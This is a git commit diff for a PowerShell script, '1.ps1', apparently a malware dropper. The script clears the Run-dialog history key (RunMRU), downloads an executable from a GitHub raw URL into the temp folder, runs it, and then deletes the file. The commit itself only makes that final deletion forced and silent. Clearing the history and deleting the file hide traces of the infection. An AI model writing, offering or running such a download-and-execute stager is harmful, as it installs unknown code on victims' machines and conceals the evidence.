16159a1dd51f17d5d53fa8991f431395e63e3693
samanaya <samanayapakisyan@gmail.com>
2024-12-04 16:14:03 +0200

    Update 1.ps1

--- 1.ps1
+++ 1.ps1
@@ -2,4 +2,4 @@ Remove-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMR
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samanaya/1/main/1.exe" -OutFile "$env:TEMP\\1.exe"
 Start-Process "$env:TEMP\\1.exe" -Wait
 Start-Sleep -Milliseconds 200
-Remove-Item "$env:TEMP\\1.exe"
+Remove-Item "$env:TEMP\\1.exe" -Force -ErrorAction SilentlyContinue
